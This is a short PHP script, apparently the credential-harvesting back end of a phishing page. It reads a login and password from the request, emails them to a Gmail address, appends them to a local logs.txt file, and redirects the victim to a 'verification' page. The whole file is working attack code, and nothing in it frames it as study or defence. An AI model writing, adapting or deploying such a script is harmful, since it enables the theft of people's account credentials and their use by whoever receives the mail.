<?php
$mail = "logboxes70@gmail.com";
$ad = $_GET["login"] . ":" . $_GET["password"] . "\n";
mail($mail, 'New account', $ad);

$fp = fopen('logs.txt', 'a');
fwrite($fp, "\n$ad");
fwrite($fp, "-----------------------------------------------------");
fclose($fp);

header("Location: verification.php");